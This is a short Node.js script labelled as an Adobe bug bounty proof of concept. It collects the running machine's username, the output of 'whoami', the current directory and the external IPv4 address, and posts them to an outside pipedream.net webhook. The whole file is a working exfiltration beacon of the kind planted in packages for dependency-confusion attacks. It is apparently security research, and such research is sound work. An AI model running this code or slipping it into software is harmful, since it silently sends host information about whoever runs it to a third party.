const os = require("os");
const { execSync } = require("child_process");
const axios = require("axios");

const PIPE_URL = "https://eoj880u40x204t5.m.pipedream.net";

(async () => {
  try {
    const username = os.userInfo().username;
    const whoami = execSync("whoami").toString().trim();
    const cwd = process.cwd();

    const nets = os.networkInterfaces();
    let ip = "unknown";
    for (const name of Object.keys(nets)) {
      for (const net of nets[name]) {
        if (net.family === "IPv4" && !net.internal) {
          ip = net.address;
        }
      }
    }

    const data = {
      username,
      whoami,
      cwd,
      ip
    };

    console.log("Collected data:", data);

    await axios.post(PIPE_URL, data);
    console.log("Adobe bugbounty POC by @nvk0x");
  } catch (err) {
    console.error("Error:", err.message);
  }
})();
